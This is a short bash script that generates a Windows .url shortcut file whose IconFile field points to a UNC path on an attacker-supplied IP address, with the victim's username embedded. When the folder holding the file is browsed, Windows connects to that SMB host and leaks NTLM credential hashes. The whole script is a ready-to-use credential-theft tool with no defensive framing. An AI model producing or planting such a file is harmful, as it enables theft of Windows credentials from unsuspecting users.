#!/bin/bash

if [ "$#" -ne 1 ]; then
  echo "Usage: $0 <IP-ADDRESS>"
  exit 1
fi

IP="$1"

cat > link.url <<EOF
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\\\$IP\\%USERNAME%.icon
IconIndex=1
EOF

echo "[+] Created link.url with IconFile=\\\\$IP\\%USERNAME%.icon"
